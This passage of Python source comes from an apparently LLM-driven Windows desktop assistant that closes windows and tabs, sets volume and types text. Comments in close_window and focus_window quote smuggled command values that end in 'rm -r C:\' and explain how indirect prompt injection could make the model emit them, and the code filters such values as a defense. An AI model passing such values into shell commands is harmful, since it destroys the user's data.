                    kernel32.CloseHandle(hproc)
                    killed = True
            more = kernel32.Process32NextW(hsnap, ctypes.byref(pe))
    finally:
        kernel32.CloseHandle(hsnap)

    return killed


def _process_running_by_name(proc_name: str) -> bool:
    """
    Comprueba si existe algún proceso vivo cuyo exe contenga proc_name.
    Usa CreateToolhelp32Snapshot — funciona independientemente de privilegios de ventana.
    """
    import ctypes
    from ctypes import wintypes

    kernel32 = ctypes.windll.kernel32
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize",              wintypes.DWORD),
            ("cntUsage",            wintypes.DWORD),
            ("th32ProcessID",       wintypes.DWORD),
            ("th32DefaultHeapID",   ctypes.POINTER(wintypes.ULONG)),
            ("th32ModuleID",        wintypes.DWORD),
            ("cntThreads",          wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase",      wintypes.LONG),
            ("dwFlags",             wintypes.DWORD),
            ("szExeFile",           ctypes.c_wchar * 260),
        ]

    target = proc_name.lower().replace(".exe", "")
    hsnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if hsnap == wintypes.HANDLE(-1).value:
        return False
    try:
        pe = PROCESSENTRY32W()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
        more = kernel32.Process32FirstW(hsnap, ctypes.byref(pe))
        while more:
            exe = pe.szExeFile.lower().replace(".exe", "")
            if target == exe or target in exe:
                return True
            more = kernel32.Process32NextW(hsnap, ctypes.byref(pe))
    finally:
        kernel32.CloseHandle(hsnap)
    return False


def _normalize(text: str) -> str:
    """Quita tildes/diacríticos y pasa a minúsculas para comparación flexible."""
    import unicodedata
    nfkd = unicodedata.normalize("NFKD", text.lower())
    return "".join(c for c in nfkd if not unicodedata.combining(c))


def close_window(hint: str) -> str:
    """
    Cierra la ventana o aplicación indicada.
    PROTECCIÓN: si el hint parece una pestaña del navegador (no una app standalone),
    redirige a close_browser_tab para no matar toda la ventana del navegador.
    """
    key = _normalize(hint)

    # ── Protección anti-destrucción de navegador ──────────────────────
    # Si el hint es algo que suena a pestaña (YouTube, un título de web, etc.)
    # y NO es el nombre del navegador en sí (opera, chrome, firefox),
    # redirigir a close_browser_tab que cierra SOLO la pestaña.
    _BROWSER_NAMES = {"opera", "chrome", "firefox", "edge", "brave", "opera gx", "navegador", "browser"}
    if key not in _BROWSER_NAMES:
        # Comprobar si el hint matchea alguna pestaña conocida via MSAA
        try:
            all_tabs = _get_browser_tabs_via_uia(_get_all_browser_hwnds())
            for tab_title in all_tabs:
                if key in tab_title.lower():
                    # Es una pestaña! Redirigir a close_browser_tab
                    import logging
                    logging.getLogger("ashley.tabs").warning(
                        f"close_window '{hint}' matched browser tab '{tab_title}' → redirecting to close_browser_tab"
                    )
                    return close_browser_tab(hint)
        except Exception:
            pass

    # 1. YouTube → cerrar la ventana dedicada
    if "youtube" in key:
        global _youtube_hwnd
        yt = _find_youtube_hwnd() or _youtube_hwnd
        if yt and _close_window_by_hwnd(yt):
            _youtube_hwnd = 0
            return "Ventana de YouTube cerrada."

    import ctypes as _ct
    _u32 = _ct.windll.user32

    # Mapeo español → nombre de proceso
    _CLOSE_MAP = {
        "administrador de tareas": "taskmgr", "task manager": "taskmgr",
        "bloc de notas": "notepad", "notepad": "notepad",
        "explorador": "explorer", "explorer": "explorer",
        "calculadora": "calculatorapp", "calculator": "calculatorapp",
        "paint": "mspaint", "microsoft paint": "mspaint",
        "word": "winword", "excel": "excel", "powerpoint": "powerpnt",
        "steam": "steam", "discord": "discord", "spotify": "spotify",
        "chrome": "chrome", "opera": "opera", "firefox": "firefox",
        "edge": "msedge", "brave": "brave",
    }

    # Construir lista de nombres de proceso candidatos
    exe_hint = APP_MAP.get(key, hint)
    if "://" in exe_hint:
        exe_hint = key
    proc_name = exe_hint.replace(".exe", "").replace(".EXE", "").split("/")[0].split("\\")[-1]
    proc_variants: set[str] = {proc_name}
    if key in _CLOSE_MAP:
        proc_variants.add(_CLOSE_MAP[key])
    # También buscar el proceso directamente por nombre del exe detectado en la ventana
    found_title = ""

    # 2. Intentar WM_CLOSE por título de ventana
    found_hwnd = [0]
    found_title_ref = [""]
    CB = _ct.WINFUNCTYPE(_ct.c_bool, _ct.c_void_p, _ct.c_void_p)
    def _enum_cb(hwnd, _):
        if not _u32.IsWindowVisible(hwnd):
            return True
        n = _u32.GetWindowTextLengthW(hwnd)
        if n == 0:
            return True
        buf = _ct.create_unicode_buffer(n + 1)
        _u32.GetWindowTextW(hwnd, buf, n + 1)
        if key in _normalize(buf.value):
            found_hwnd[0] = hwnd
            found_title_ref[0] = buf.value
            return False
        return True
    _u32.EnumWindows(CB(_enum_cb), 0)

    if found_hwnd[0]:
        found_title = found_title_ref[0]
        # Añadir el proceso de la ventana encontrada a los candidatos
        proc_from_hwnd = _get_process_name_for_hwnd(found_hwnd[0]).replace(".exe", "")
        if proc_from_hwnd:
            proc_variants.add(proc_from_hwnd)
        _close_window_by_hwnd(found_hwnd[0])
        time.sleep(0.5)

    # 3. Stop-Process + taskkill por nombre — independiente de si vemos la ventana.
    # `pname` se interpola en una f-string que pasa a PowerShell/cmd. Si llega
    # contaminado por indirect prompt injection (ej. `notepad" -Force; rm -r C:\\`),
    # los caracteres rompen las comillas y ejecutan código arbitrario. Filtramos
    # con _is_valid_proc_name — los nombres reales son `[A-Za-z0-9_.-]+`, los
    # ataques contienen `&`, `;`, `"`, espacios, etc. Si no pasa el filtro,
    # ignoramos ese candidato (puede haber otros válidos en proc_variants vía
    # _CLOSE_MAP o el lookup por hwnd).
    for pname in list(proc_variants):
        if not _is_valid_proc_name(pname):
            continue
        try:
            subprocess.run(
                ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-c",
                 f'Stop-Process -Name "{pname}" -Force -ErrorAction SilentlyContinue'],
                capture_output=True, text=True, timeout=5,
            )
        except Exception:
            pass
        try:
            subprocess.run(
                ["cmd", "/c", f"taskkill /F /IM {pname}.exe"],
                capture_output=True, text=True, timeout=5,
            )
        except Exception:
            pass

    # 4. SeDebugPrivilege + TerminateProcess — último recurso para procesos elevados
    for pname in list(proc_variants):
        if not _is_valid_proc_name(pname):
            continue
        _terminate_process_by_name(pname)

    # Verificar con snapshot de procesos (NO con ventanas — las elevadas pueden ser invisibles)
    time.sleep(0.8)
    still_running = any(_process_running_by_name(p) for p in proc_variants)

    if not still_running:
        return f"'{found_title or hint}' cerrado."

    # Sigue corriendo — informar honestamente
    if found_title:
        return (
            f"No pude cerrar '{found_title}'. "
            f"Probablemente requiere permisos de administrador que Reflex no tiene. "
            f"Tendría que cerrarlo el jefe manualmente."
        )
    # No encontramos ventana ni proceso — no estaba abierto
    still_by_proc = any(_process_running_by_name(p) for p in proc_variants)
    if still_by_proc:
        return f"No pude cerrar '{hint}'."
    return f"No encontré '{hint}' abierto."


# ── Navegador: HWND capturado ─────────────────────────────────────────────────

# HWND de la ventana del navegador que abrió YouTube.
# Se captura justo después de webbrowser.open() en el proceso principal
# (donde no hay foreground lock) y se reutiliza en llamadas posteriores.
_youtube_hwnd: int = 0

_BROWSER_WIN32_CLASSES = {"Chrome_WidgetWin_1", "MozillaWindowClass"}

# Procesos que son browsers reales (tienen pestañas que se cierran con Ctrl+W)
# Apps Electron como Riot Client, Discord, VS Code NO están aquí aunque usen Chrome_WidgetWin_1
_REAL_BROWSER_PROCS = {
    "opera.exe", "operagx.exe", "chrome.exe", "firefox.exe",
    "brave.exe", "msedge.exe", "vivaldi.exe", "iexplore.exe",
}


def _find_youtube_hwnd() -> int:
    """
    Enumera todas las ventanas de navegador visibles y devuelve el HWND
    de la que tenga 'youtube' en el título (tab activo = YouTube).
    Devuelve 0 si no encuentra ninguna.
    """
    import ctypes
    user32 = ctypes.windll.user32
    result = [0]

    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def _cb(hwnd, _):
        if not user32.IsWindowVisible(hwnd):
            return True
        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(hwnd, cls, 256)
        if cls.value not in _BROWSER_WIN32_CLASSES:
            return True
        n = user32.GetWindowTextLengthW(hwnd)
        if n == 0:
            return True
        buf = ctypes.create_unicode_buffer(n + 1)
        user32.GetWindowTextW(hwnd, buf, n + 1)
        if "youtube" in buf.value.lower():
            result[0] = hwnd
            return False  # parar en el primero que coincida
        return True

    user32.EnumWindows(CB(_cb), 0)
    return result[0]


def _capture_browser_hwnd(wait: float = 1.5) -> int:
    """
    Espera hasta `wait + 4` segundos a que aparezca una ventana de navegador
    con 'YouTube' en el título (el tab activo cargó YouTube).
    """
    import logging
    log = logging.getLogger("ashley.music")

    deadline = time.time() + wait + 4.0
    time.sleep(wait)

    while time.time() < deadline:
        hwnd = _find_youtube_hwnd()
        if hwnd:
            log.warning(f"captured hwnd={hwnd} (YouTube tab found)")
            return hwnd
        time.sleep(0.4)

    log.warning("capture: YouTube window not found within timeout")
    return 0


def reset_youtube_hwnd():
    """Llamar en on_load para limpiar el HWND entre reinicios."""
    global _youtube_hwnd
    _youtube_hwnd = 0


def _send_keys_subprocess(hwnd: int, keys_sequence: list[tuple[int, ...]]) -> bool:
    """
    Lanza un subprocess que enfoca `hwnd` y envía secuencias de teclas via keybd_event.
    Usa AllowSetForegroundWindow + keybd_event (funciona desde background, a diferencia de SendInput).
    keys_sequence: lista de tuplas de VK codes, ej: [(0x11, 0x57)] → Ctrl+W
    """
    import sys, ctypes, json

    script = r"""
import sys, time, ctypes, json

hwnd = int(sys.argv[1])
keys_sequence = json.loads(sys.argv[2])

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

if not user32.IsWindow(hwnd):
    sys.exit(1)

fg     = user32.GetForegroundWindow()
fg_tid = user32.GetWindowThreadProcessId(fg, None)
my_tid = kernel32.GetCurrentThreadId()
if fg_tid and fg_tid != my_tid:
    user32.AttachThreadInput(my_tid, fg_tid, True)
if user32.IsIconic(hwnd):
    user32.ShowWindow(hwnd, 9)
user32.BringWindowToTop(hwnd)
user32.SetForegroundWindow(hwnd)
if fg_tid and fg_tid != my_tid:
    user32.AttachThreadInput(my_tid, fg_tid, False)
time.sleep(0.5)

KEYEVENTF_KEYUP = 0x0002

def hotkey(*vks):
    for vk in vks:           user32.keybd_event(vk, 0, 0, 0); time.sleep(0.05)
    for vk in reversed(vks): user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0); time.sleep(0.05)

for combo in keys_sequence:
    hotkey(*combo)
    time.sleep(0.3)

sys.exit(0)
"""
    keys_json = json.dumps(keys_sequence)
    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", script, str(hwnd), keys_json],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        ctypes.windll.user32.AllowSetForegroundWindow(proc.pid)
        proc.wait(timeout=8)
        return proc.returncode == 0
    except Exception:
        return False


def _find_and_close_tab_subprocess(hwnd: int, hint: str) -> bool:
    """
    Subprocess con AllowSetForegroundWindow + keybd_event que:
    1. Enfoca la ventana hwnd
    2. Cicla tabs con Ctrl+Tab (keybd_event — funciona desde background)
    3. Lee el título tras cada ciclo
    4. Cierra con Ctrl+W cuando encuentra el hint
    """
    import sys, ctypes, logging
    log = logging.getLogger("ashley.tabs")

    script = r"""
import sys, time, ctypes

hwnd = int(sys.argv[1])
hint = sys.argv[2].lower()

user32   = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

if not user32.IsWindow(hwnd):
    print("ERR: hwnd invalid", file=sys.stderr)
    sys.exit(1)

def get_title(h):
    n = user32.GetWindowTextLengthW(h)
    buf = ctypes.create_unicode_buffer(n + 1)
    user32.GetWindowTextW(h, buf, n + 1)
    return buf.value

# ── Enfocar ──────────────────────────────────────
fg     = user32.GetForegroundWindow()
fg_tid = user32.GetWindowThreadProcessId(fg, None)
my_tid = kernel32.GetCurrentThreadId()
if fg_tid and fg_tid != my_tid:
    user32.AttachThreadInput(my_tid, fg_tid, True)
if user32.IsIconic(hwnd):
    user32.ShowWindow(hwnd, 9)
user32.BringWindowToTop(hwnd)
user32.SetForegroundWindow(hwnd)
if fg_tid and fg_tid != my_tid:
    user32.AttachThreadInput(my_tid, fg_tid, False)
time.sleep(0.6)

# ── Teclado via keybd_event ──────────────────────
KEYEVENTF_KEYUP = 0x0002
VK_CONTROL = 0x11
VK_NEXT    = 0x22  # Page Down — usamos esto en lugar de Ctrl+Tab
VK_W       = 0x57

# Por qué Ctrl+Page Down y no Ctrl+Tab:
# Opera GX (y opcionalmente Opera/Chrome con cierta config) tiene activado
# por defecto "Ciclar entre las 2 últimas pestañas activas" con Ctrl+Tab.
# Eso significa que Ctrl+Tab solo alterna entre 2 pestañas (la actual y la
# última que tuvo foco), nunca recorre todas. Resultado: el cycling no
# encuentra tabs de fondo aunque existan.
# Ctrl+Page Down es el secuencial siempre-a-la-derecha y NO está afectado
# por esa configuración. Confirmado empíricamente con Opera GX 2026-04-27.

def hotkey(*vks):
    for vk in vks:           user32.keybd_event(vk, 0, 0, 0); time.sleep(0.05)
    for vk in reversed(vks): user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0); time.sleep(0.05)

# ── Comprobar tab activo ─────────────────────────
title_now = get_title(hwnd).lower()
print(f"CURRENT: {title_now}", file=sys.stderr)
if hint in title_now:
    hotkey(VK_CONTROL, VK_W)
    time.sleep(0.2)
    print("CLOSED_ACTIVE", file=sys.stderr)
    sys.exit(0)

# ── Ciclar tabs (Ctrl+Page Down secuencial) ──────
start_title = title_now
MAX_TABS = 40

for i in range(MAX_TABS):
    hotkey(VK_CONTROL, VK_NEXT)
    time.sleep(0.8)
    title = get_title(hwnd).lower()
    print(f"TAB {i+1}: {title}", file=sys.stderr)
    if hint in title:
        hotkey(VK_CONTROL, VK_W)
        time.sleep(0.2)
        print(f"CLOSED_TAB_{i+1}", file=sys.stderr)
        sys.exit(0)
    if i > 0 and title == start_title:
        print("FULL_CYCLE", file=sys.stderr)
        sys.exit(1)

print("NOT_FOUND", file=sys.stderr)
sys.exit(1)
"""
    try:
        proc = subprocess.Popen(
            [sys.executable, "-c", script, str(hwnd), hint],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        )
        ctypes.windll.user32.AllowSetForegroundWindow(proc.pid)
        proc.wait(timeout=70)
        stderr = proc.stderr.read().decode(errors="replace").strip()
        if stderr:
            log.warning(f"tab-cycle: {stderr[:2000]}")
        return proc.returncode == 0
    except Exception as e:
        log.warning(f"tab-cycle failed: {e}")
        return False


def close_browser_tab(hint: str, prefer_cdp: bool = False) -> str:
    """
    Cierra el tab del navegador cuyo título contenga `hint`.

    MODO HÍBRIDO (v0.13.25):
      • Si prefer_cdp=True AND el browser tiene Chrome DevTools Protocol activo
        en localhost:9222 → usa CDP HTTP API. Cierra por ID, sin SendInput,
        sin foco visible, sub-100ms.
      • Si CDP no está disponible o prefer_cdp=False → cae al path legacy:
        0. Busca en la lista MSAA de tabs el título completo que matchee el hint.
        1. Tab activo visible en título de ventana → PowerShell Ctrl+W.
        2. Tab de fondo → PowerShell cicla tabs con Ctrl+PageDown y cierra.

    IMPORTANTE: nunca hace WM_CLOSE sobre la ventana del navegador, aunque
    `_youtube_hwnd` esté seteado. Desde que `play_music` reutiliza la ventana
    del navegador del usuario en vez de abrir una --new-window dedicada,
    `_youtube_hwnd` apunta al hwnd del navegador entero — cerrarlo mataría
    TODAS las pestañas del usuario, no solo la de YouTube.
    """
    import ctypes, logging
    user32 = ctypes.windll.user32
    log = logging.getLogger("ashley.tabs")
    global _youtube_hwnd  # se modifica en ambos paths (CDP y legacy)

    # ── Path CDP (modo moderno opt-in) ───────────────────────────────────
    if prefer_cdp:
        from . import browser_cdp as _cdp
        if _cdp.is_cdp_available():
            try:
                matches = _cdp.find_tabs_matching(hint)
                log.warning(f"close_browser_tab: CDP path — found {len(matches)} match(es) for hint={hint!r}")
                if not matches:
                    return f"No encontré ninguna pestaña con '{hint}' abierta."
                closed_titles = []
                for t in matches:
                    if _cdp.close_tab(t["id"]):
                        closed_titles.append(t.get("title", ""))
                if not closed_titles:
                    return f"No pude cerrar la pestaña '{hint}'."
                if "youtube" in hint.lower():
                    _youtube_hwnd = 0
                if len(closed_titles) == 1:
                    return f"Pestaña '{hint}' cerrada."
                return f"{len(closed_titles)} pestañas cerradas con '{hint}' en el título."
            except Exception as _e:
                log.warning(f"close_browser_tab: CDP path failed ({_e}), falling back to legacy")
                # Cae al path legacy abajo

    # ── Path legacy (SendInput / keybd_event) ────────────────────────────
    # Mantenido como fallback porque (a) el user puede no tener CDP activado,
    # (b) Firefox no soporta CDP, (c) si CDP falla por algún motivo
    # transitorio, el legacy aún puede funcionar.

    key = hint.lower().strip()
    log.warning(f"close_browser_tab: hint={hint!r} key={key!r}")

    # Paso 0: Buscar el título completo en la lista MSAA de tabs.
    # El usuario puede dar un hint parcial ("diagramme") pero el tab cycling
    # necesita matchear contra el título completo de la ventana. Si MSAA
    # tiene el título exacto, lo usamos como key mejorada.
    try:
        all_tabs = _get_browser_tabs_via_uia(_get_all_browser_hwnds())
        for tab_title in all_tabs:
            if key in tab_title.lower():
                improved_key = tab_title.lower()
                log.warning(f"close_browser_tab: MSAA found full title: {tab_title!r} → using as key")
                key = improved_key
                break
    except Exception:
        pass

    # Paso 1: Buscar ventana cuyo título ya contenga el hint (tab activo)
    found = []
    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)

    def _cb(hwnd, _):
        if not user32.IsWindowVisible(hwnd):
            return True
        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(hwnd, cls, 256)
        if cls.value not in _BROWSER_WIN32_CLASSES:
            return True
        n = user32.GetWindowTextLengthW(hwnd)
        if n == 0:
            return True
        buf = ctypes.create_unicode_buffer(n + 1)
        user32.GetWindowTextW(hwnd, buf, n + 1)
        found.append((hwnd, buf.value))
        return True

    user32.EnumWindows(CB(_cb), 0)
    log.warning(f"close_browser_tab: found windows: {[(h, t[:50]) for h, t in found]}")

    VK_CONTROL, VK_W = 0x11, 0x57

    if not key or key == "activo":
        # Cerrar tab activo del navegador en foreground
        fg = user32.GetForegroundWindow()
        cls = ctypes.create_unicode_buffer(256)
        user32.GetClassNameW(fg, cls, 256)
        if cls.value in _BROWSER_WIN32_CLASSES:
            ok = _send_keys_subprocess(fg, [[VK_CONTROL, VK_W]])
            return "Pestaña cerrada." if ok else "No pude cerrar la pestaña activa."
        return "No hay navegador en primer plano."

    def _tab_still_visible(search_key: str) -> bool:
        """Comprueba si alguna ventana del navegador aún tiene el hint en el título."""
        still_there = [False]
        def _chk(hwnd, _):
            if not user32.IsWindowVisible(hwnd):
                return True
            cls2 = ctypes.create_unicode_buffer(256)
            user32.GetClassNameW(hwnd, cls2, 256)
            if cls2.value not in _BROWSER_WIN32_CLASSES:
                return True
            n2 = user32.GetWindowTextLengthW(hwnd)
            if n2 == 0:
                return True
            buf2 = ctypes.create_unicode_buffer(n2 + 1)
            user32.GetWindowTextW(hwnd, buf2, n2 + 1)
            if search_key in buf2.value.lower():
                still_there[0] = True
                return False
            return True
        CB2 = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
        user32.EnumWindows(CB2(_chk), 0)
        return still_there[0]

    # Si el hint aparece en el título de alguna ventana → tab activo, Ctrl+W directo
    for h, t in found:
        if key in t.lower():
            log.warning(f"close_browser_tab: hint in title, Ctrl+W on hwnd={h}")
            _send_keys_subprocess(h, [[VK_CONTROL, VK_W]])
            # Opera GX y otros Chromium tardan en actualizar el título de ventana
            # tras cerrar un tab. Hacemos dos checks con espera progresiva.
            for _wait in (1.0, 1.5):
                time.sleep(_wait)
                if not _tab_still_visible(key):
                    if "youtube" in key:
                        _youtube_hwnd = 0
                    return f"Pestaña '{hint}' cerrada."
            log.warning(f"close_browser_tab: tab still visible after Ctrl+W (may be slow browser)")
            # Falló o el browser fue muy lento → continuar al ciclo de tabs

    # Paso 2: Tab de fondo → subprocess cicla tabs en cada ventana de navegador
    if not found:
        return f"No encontré ninguna pestaña con '{hint}' abierta."

    for h, t in found:
        log.warning(f"close_browser_tab: cycling tabs in hwnd={h} '{t[:50]}'")
        ok = _find_and_close_tab_subprocess(h, key)
        if ok:
            for _wait in (1.0, 1.5):
                time.sleep(_wait)
                if not _tab_still_visible(key):
                    if "youtube" in key:
                        _youtube_hwnd = 0
                    return f"Pestaña '{hint}' cerrada."

    return f"No pude cerrar la pestaña '{hint}'. Puede que no esté abierta en el navegador o el tab esté en segundo plano y no se pudo acceder."


# ── Volumen ───────────────────────────────────────────────────────────────────

def _volume_pycaw(action: str, value: Optional[str]) -> str:
    # v0.13.19: pycaw 20251023+ cambió la API. Antes:
    #   devices = AudioUtilities.GetSpeakers()  # retornaba IMMDevice
    #   iface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    #   vol = cast(iface, POINTER(IAudioEndpointVolume))
    # Ahora GetSpeakers() retorna un wrapper AudioDevice y EndpointVolume
    # ya es la interfaz IAudioEndpointVolume — sin Activate ni cast.
    # Causa del bug "Error de volumen: 'AudioDevice' object has no
    # attribute 'Activate'" en v0.13.18.
    from pycaw.pycaw import AudioUtilities

    device = AudioUtilities.GetSpeakers()
    vol = device.EndpointVolume
    current = vol.GetMasterVolumeLevelScalar()

    if action == "up":
        nv = min(1.0, current + 0.10)
        vol.SetMasterVolumeLevelScalar(nv, None)
        return f"Volumen subido a {int(nv * 100)}%."
    elif action == "down":
        nv = max(0.0, current - 0.10)
        vol.SetMasterVolumeLevelScalar(nv, None)
        return f"Volumen bajado a {int(nv * 100)}%."
    elif action == "mute":
        muted = vol.GetMute()
        vol.SetMute(not muted, None)
        return "Audio silenciado." if not muted else "Audio activado."
    elif action == "set" and value:
        # v0.13.17: defense-in-depth. execute_action() ya valida value
        # como int 0-100 antes de llegar aquí, pero protección extra por
        # si alguna ruta evita ese chequeo (e.g. llamada directa desde
        # tests u otro código).
        try:
            iv = int(str(value).strip())
        except (ValueError, TypeError):
            return f"Volumen 'set' con valor no numérico: '{value}' (esperado 0-100)."
        lv = max(0.0, min(1.0, iv / 100))
        vol.SetMasterVolumeLevelScalar(lv, None)
        return f"Volumen establecido al {iv}%."
    return f"Acción de volumen desconocida: '{action}'"


def _volume_powershell(action: str, value: Optional[str] = None) -> str:
    """Fallback que SOLO soporta up/down/mute. Para 'set' tendríamos que
    invocar nircmd o un script PS más complejo — no merece la pena ese
    path; mejor reportar honestly que no se puede.

    v0.13.16: BUG GRAVE corregido. Antes:
        key_map.get(action, "173")
    El default '173' es la tecla de MUTE. Si la action era 'set' (porque
    pycaw falló), el código defaulteaba a mute y silenciaba el audio.
    El bug del 'súbele al máximo → silencio' venía de aquí, no de Ashley
    emitiendo set:0 (que era la teoría inicial).
    Ahora: si la action no está en key_map, NO ejecutamos nada y
    devolvemos error claro.
    """
    key_map = {"up": "175", "down": "174", "mute": "173"}
    if action not in key_map:
        # NUNCA defaultear a mute (ese era el bug). Mensaje user-friendly:
        # los detalles técnicos van al log, el user solo ve "no se pudo
        # ajustar el volumen". v0.13.18: si pycaw está bundled (debería),
        # este path NO se debería ejecutar nunca en producción.
        import logging
        logging.getLogger("ashley.actions").warning(
            "volume action '%s' value=%s fell back to PowerShell which "
            "doesn't support it; pycaw should be bundled — check the venv",
            action, value,
        )
        return "No se pudo ajustar el volumen ahora mismo. Reinicia Ashley si el problema persiste."

    k = key_map[action]
    reps = 5 if action in ("up", "down") else 1
    ps = "$w=New-Object -ComObject WScript.Shell;" + "".join(
        [f"$w.SendKeys([char]{k});" for _ in range(reps)]
    )
    subprocess.run(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-c", ps],
        capture_output=True,
    )
    labels = {
        "up":   "Volumen subido.",
        "down": "Volumen bajado.",
        "mute": "Audio silenciado/activado.",
    }
    return labels[action]


def control_volume(action: str, value: Optional[str] = None) -> str:
    try:
        return _volume_pycaw(action, value)
    except ImportError:
        # v0.13.18: pasar value al fallback. Antes _volume_powershell se
        # llamaba sin value, así que para action="set" el mensaje de
        # error decía "set:None" en vez del valor real que Ashley emitió.
        return _volume_powershell(action, value)
    except Exception as e:
        return f"Error de volumen: {e}"




# ── Control de teclado ────────────────────────────────────────────────────────

def _get_pyautogui():
    """Importa pyautogui con configuración segura."""
    import pyautogui
    pyautogui.PAUSE = 0.05   # Pequeña pausa entre acciones
    pyautogui.FAILSAFE = True  # Mover ratón a esquina superior-izquierda cancela
    return pyautogui


def focus_window(title_substr: str) -> str:
    """
    Activa una ventana cuyo título contenga title_substr.
    Usa WScript.Shell.AppActivate (sin dependencias extra).
    """
    # title_substr llega del LLM via [action:focus_window:X]. Si trae
    # metacaracteres de shell (LLM engañado por prompt injection externa),
    # rechazamos en lugar de interpolar a PowerShell. Sin esto, un
    # title_substr tipo `notepad"); rm -r C:\\; ("x` rompe las comillas y
    # ejecuta código arbitrario.
    if not _is_shell_safe(title_substr):
        return f"Título de ventana inválido (caracteres bloqueados por seguridad)."
    ps = f'(New-Object -ComObject WScript.Shell).AppActivate("{title_substr}")'
    subprocess.run(
        ["powershell", "-WindowStyle", "Hidden", "-NonInteractive", "-c", ps],
        capture_output=True,
    )
    time.sleep(0.5)  # Dar tiempo a que la ventana tome el foco
    return f"Ventana '{title_substr}' activada."


def type_text(text: str) -> str:
    """
    Escribe texto en el control activo usando el portapapeles.
    Soporta acentos, emojis, Unicode y saltos de línea (\n → newline real).
    El portapapeles anterior se restaura después.
    """
    # Convertir \n literal (que Ashley escribe en el tag) en saltos de línea reales
    text = text.replace("\\n", "\n").replace("\\t", "\t")
    try:
        import pyperclip
        pya = _get_pyautogui()

        try:
            previous = pyperclip.paste()
        except Exception:
            previous = ""

        pyperclip.copy(text)
        time.sleep(0.15)
        pya.hotkey("ctrl", "v")
        time.sleep(0.1)

        try:
            pyperclip.copy(previous)
        except Exception:
            pass

        preview = text[:80].replace("\n", "↵") + ("…" if len(text) > 80 else "")
        return f"Texto escrito ({len(text)} caracteres): '{preview}'"
    except ImportError:
        return "Falta pyautogui o pyperclip. Instala con: pip install pyautogui pyperclip"


def type_in_window(window_title: str, text: str) -> str:
    """Enfoca una ventana por título y luego escribe el texto."""
    focus_result = focus_window(window_title)
    time.sleep(0.4)
    type_result = type_text(text)
    return f"{focus_result} → {type_result}"


def write_to_app(app_name: str, text: str) -> str:
    """
    Abre una app (si no está ya abierta), espera a que esté lista,
    la enfoca explícitamente y escribe el texto en ella.
    """
    # Abrir la app
    open_result = open_app(app_name)
    time.sleep(2.0)  # Esperar a que la app abra

    # Intentar enfocar la ventana de la app por nombre (más fiable que confiar en el foco actual)
    # Usamos el app_name como hint — la mayoría de apps tienen su nombre en el título
    focus_result = focus_window(app_name)
    time.sleep(0.4)  # Pequeña pausa tras enfocar

    # Escribir el texto
    type_result = type_text(text)
    return f"{open_result} → {type_result}"


def press_hotkey(keys: list[str]) -> str:
    """Ejecuta una combinación de teclas (ej: ctrl+c, alt+f4, ctrl+shift+t)."""
    try:
        pya = _get_pyautogui()
        pya.hotkey(*keys)
        return f"Atajo '{'+'.join(keys)}' ejecutado."
    except ImportError:
        return "Falta pyautogui. Instala con: pip install pyautogui"
    except Exception as e:
        return f"Error ejecutando atajo: {e}"


def press_key(key: str) -> str:
    """Presiona una tecla (enter, tab, escape, f5, etc.)."""
    try:
        pya = _get_pyautogui()
        pya.press(key)
        return f"Tecla '{KEY_LABELS.get(key.lower(), key)}' presionada."
    except ImportError:
        return "Falta pyautogui. Instala con: pip install pyautogui"
    except Exception as e:
        return f"Error presionando tecla: {e}"


# ── Ejecutor central ──────────────────────────────────────────────────────────

def execute_action(action_type: str, params: list[str], browser_opened: bool = False,
                    lang: str = "en", prefer_cdp: bool = False) -> dict:
    """
    Ejecuta la acción pedida por Ashley.
    Devuelve: { success: bool, result: str, screenshot: str | None, browser_opened: bool }

    Args:
      action_type: tipo de acción ("play_music", "close_tab", etc.)
      params: lista de strings con los parámetros del tag
      browser_opened: estado actual del browser (para optimizaciones)
      lang: afecta a los mensajes de resultado visibles al usuario
      prefer_cdp: v0.13.25 — si True, intenta primero el path moderno
                  Chrome DevTools Protocol para acciones de browser
                  (play_music, close_tab). Si CDP no está disponible o
                  falla, cae al path legacy SendInput. Default False
                  (opt-in via Settings → Acciones → Modo moderno browser).
    """
    try:
        if action_type == "screenshot":
            img = take_screenshot()
            msg = ("Screenshot taken. Here's what's on screen."
                   if lang == "en"
                   else "Captura de pantalla tomada. Aquí tienes lo que hay en pantalla.")
            return {"success": True,
                    "result": msg,
                    "screenshot": img, "browser_opened": browser_opened}

        elif action_type == "open_app":
            return {"success": True, "result": open_app(" ".join(params), lang=lang),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "play_music":
            # v0.13.25: play_music ahora propaga success real (3-tuple)
            # para que execute_and_record_action pueda disparar la
            # disculpa de Ashley en personaje cuando la canción no se
            # reproduce. Antes siempre se devolvía success=True aunque
            # play_music hubiera devuelto un mensaje 'Error: ...'.
            msg, new_flag, success = play_music(
                " ".join(params),
                browser_already_open=browser_opened,
                prefer_cdp=prefer_cdp,
            )
            return {"success": success, "result": msg,
                    "screenshot": None, "browser_opened": new_flag}

        elif action_type == "search_web":
            return {"success": True, "result": search_web(params[0] if params else ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "open_url":
            return {"success": True, "result": open_url(params[0] if params else ""),
                    "screenshot": None, "browser_opened": browser_opened}

        elif action_type == "volume":
            sub = params[0] if params else "up"
